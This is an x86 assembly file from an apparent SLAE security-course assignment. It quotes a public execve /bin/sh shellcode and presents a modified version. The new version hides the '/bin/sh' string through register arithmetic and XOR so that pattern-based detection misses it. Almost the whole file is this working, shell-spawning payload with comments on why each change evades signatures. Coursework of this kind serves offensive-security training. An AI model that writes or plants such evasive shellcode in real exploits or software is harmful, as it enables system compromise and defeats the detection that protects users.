; SLAE-xxx 
; assigmemnt 6.1: polymorphic version of shellstorm shellcode 
; originality: tried to use my own opcode replacement 
; i dont fully agree with the polymorphic term used here 
; for me polymorphic means "change everytime" but here we just want a 
; modified version of a shellcode to avoid pattern detection 
; it wont change everytime (see assignment bonus for that) 

; execve /bin/sh 
; http://shell-storm.org/shellcode/files/shellcode-827.php
; by Hamza Megahed 
;xor    %eax,%eax 
;push   %eax ; push 0 
;push   $0x68732f2f
;push   $0x6e69622f
;mov    %esp,%ebx 
;push   %eax ; push 0 
;push   %ebx ; 
;mov    %esp,%ecx
;mov    $0xb,%al
;int    $0x80

; the modified version should not exceed size of original by more than 150% 
; you can check it with size ./polybinary 
; size binsh
;   text	   data	    bss	    dec	    hex	filename
;     23	      0	      0	     23	     17	binsh
;size polybinsh
;   text	   data	    bss	    dec	    hex	filename
;     30	      0	      0	     30	     1e	polybinsh

global _start
_start:

; this is a standard exceve /bin/sh shellcode 
; we will try to avoid string "/bin/sh" pattern 
; we will use a register and modify data to avoid detection 
xor esi,esi; create 0 
mov edi,esi; store 0 into edi 
push esi; push 0 
; we recreate push 0x68732f2f ; 
add esi,0x68732f2f; 
push esi; 
; we recreate push 0x6e69622f ; "/bin" 
inc esi; avoid null byte in next xor 
xor esi,0x61a4d1f
; we xor the value to get "/bin"  
push esi; 
; that way we dont have the classic push /sh push /bin 
mov ebx,esp; 
push edi; 
push ebx; 
mov ecx,esp ; 
; syscall execve  
mov al,0xb 
int 0x80 
